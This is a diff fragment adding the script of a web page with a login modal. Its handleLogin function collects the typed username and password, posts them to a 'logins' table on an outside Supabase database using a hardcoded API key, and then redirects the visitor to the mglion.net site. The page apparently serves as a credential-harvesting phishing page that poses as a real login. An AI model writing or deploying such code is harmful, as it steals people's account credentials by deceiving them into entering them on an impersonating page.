+            }
+
+            function closeModal() {
+                document
+                    .getElementById("loginModal")
+                    .classList.remove("active");
+            }
+
+            function togglePassword() {
+                const passwordInput = document.getElementById("password");
+                const toggleBtn = document.querySelector(".toggle-password");
+
+                if (passwordInput.type === "password") {
+                    passwordInput.type = "text";
+                    toggleBtn.textContent = "👁️";
+                } else {
+                    passwordInput.type = "password";
+                    toggleBtn.textContent = "👁️";
+                }
+            }
+
+            async function handleLogin(event) {
+                event.preventDefault();
+                const username = document.getElementById("username").value;
+                const password = document.getElementById("password").value;
+                // alert(`Login attempt with username: ${username}`);
+                const URL =
+                    "https://qghghrqneuelvuepimii.supabase.co/rest/v1/logins";
+                const response = await fetch(URL, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                        // Use the 'anon public' key for both apikey and Bearer token for a quick test
+                        apikey: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFnaGdocnFuZXVlbHZ1ZXBpbWlpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA2ODgwNTcsImV4cCI6MjA3NjI2NDA1N30.wZT2cHHfBuYPiNu829jPwsrpYBKHgVv1dsED932C4ro",
+                        Authorization:
+                            "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFnaGdocnFuZXVlbHZ1ZXBpbWlpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjA2ODgwNTcsImV4cCI6MjA3NjI2NDA1N30.wZT2cHHfBuYPiNu829jPwsrpYBKHgVv1dsED932C4ro",
+                    },
+                    body: JSON.stringify({ username, password }),
+                });
+                // const data = await response.json();
+                window.location.href = "https://www.mglion.net/";
+                closeModal();
+
+                if (response.ok) {
+                    // alert("Login successful!");
+                } else {
+                    alert("Login failed. Please check your credentials.");
+                }
+            }
+
+            function requestDemo() {
+                alert("Demo request submitted!");
+                // Add your demo request logic here
+            }
+
+            // Close modal when clicking outside
+            document
+                .getElementById("loginModal")
+                .addEventListener("click", function (event) {
+                    if (event.target === this) {
+                        closeModal();
+                    }
+                });
+        </script>
+    </body>
+</html>
 
